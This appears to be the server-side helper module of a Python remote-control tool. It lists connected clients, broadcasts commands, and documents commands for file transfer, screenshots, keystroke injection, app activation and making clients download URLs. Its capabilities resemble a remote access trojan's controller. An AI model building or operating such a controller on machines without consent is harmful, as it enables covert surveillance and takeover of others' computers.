import socket
import platform
import os

def refresh(clients):
    clear()
    print '\nListening for Clients...\n'
    if len(clients) > 0:
        for i in range(len(clients)):
            print '[' + str((i + 1)) + '] Client: ' + clients[i] + '\n'
    else:
        print '...\n'
    print '...\n'
    print '[0] Exit\n'
    print '[99] Send Command to all clients \n'
    print '\nPress Ctrl + C to interact with client.'


# remove client / socket
def removeSock(socks, clients, activate):
    socks[activate].close()
    socks.remove(socks[activate])
    clients.remove(clients[activate])
    # refresh client list
    refresh(clients)
    active = False
    return socks, clients, active


# clear screen
def clear():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')


def setup(port):
    host = '0.0.0.0'
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    c.bind((host, port))
    c.listen(128)
    return c


def helpMessage(type):
    if type == 'download':
        return '''Usage: download [-h] remote_filename [local_filename]

Positional Arguments:
  remote_filename        The name of the file to download

Optional Arguments:
  -h, --help             Show this help message
  local_filename         The new name for the file on the server

Examples:
  download test.txt file.txt
  -> The file 'test.txt' on the client will be downloaded to 'file.txt'

  download example.exe
  -> The file 'example.exe' on the client will be downloaded to 'example.exe'''
    elif type == 'upload':
        return '''Usage: upload [-h] local_filename [remote_filename]

Positional Arguments:
  local_filename         The name of the file to upload

Optional Arguments:
  -h, --help             Show this help message
  remote_filename        The new name for the file on the client

Examples:
  upload test.txt file.txt
  -> The file 'test.txt' on the server will be uploaded to 'file.txt'

  upload example.exe
  -> The file 'example.exe' on the server will be uploaded to 'example.exe'''
    elif type == 'encryption':
        return '''Usage: encryption [-h] on | off | status

Arguments:
  on                     Enable the AES-traffic-encryption
  off                    Disable the AES-traffic-encryption
  status                 Display the current encryption status

Optional Arguments:
  -h, --help             Show this help message

Examples:
  encryption off
  -> Turn the encryption off

  encryption status
  -> Shows wether the encryption is enabled or disabled'''
    elif type == 'screenshot':
        return '''Usage: screenshot [-h]

optional arguments:
  -h, --help              show this help message and exit'''
    elif type == 'sendKeys':
        return  '''Usage: sendKeys [-h] keystrokes

positional arguments:
  keystrokes              the keystrokes to execute on the client

optional arguments:
  -h, --help              show this help message and exit'''
    elif type == 'activateApp':
        return '''Usage: activateApp [-h] application

positional arguments:
  application             a part of the name of the app you want to display in the foreground

optional arguments:
  -h, --help              show this help message and exit'''
    elif type == 'downHTTP':
        return '''Usage: downHTTP [-h] url [remote_filename]

positional arguments:
  url                     the full url to download

optional arguments:
  -h, --help              show this help message and exit
  remote_filename         the name of the file it will be downloaded to '''


def wrongArgumentNumber(cmd, min=2, max=3):
    if len(cmd.split(' ')) < min or len(cmd.split(' ')) > max:
        return True
    elif len(cmd.split(' ')) > 1:
        if cmd.split(' ')[1] == '-h' or cmd.split(' ')[1] == '--help' or cmd.split(' ')[1] == '':
            return True
    return False
